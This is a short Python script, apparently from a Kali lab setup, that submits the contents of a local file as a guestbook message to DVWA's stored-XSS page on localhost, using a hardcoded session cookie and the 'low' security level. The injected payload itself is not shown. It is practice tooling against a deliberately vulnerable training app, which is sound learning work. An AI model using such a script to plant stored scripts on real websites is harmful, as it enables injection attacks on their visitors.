#!/usr/bin/env python3

import requests

cookies = {'PHPSESSID':'ln300jid39fqgllucam2l4kscb', 'security':'low'}

url='http://127.0.0.1/dvwa/vulnerabilities/xss_s/'
form_input = open("/home/kali/Desktop/scripts/keyboard_Input.txt")
form_send = form_input.read()
form_data = {'txtName':'Test IT', 'mtxMessage':f"'{form_send}'", 'btnSign':'Sign+Guestbook'}
r = requests.post(url, cookies=cookies, data=form_data)

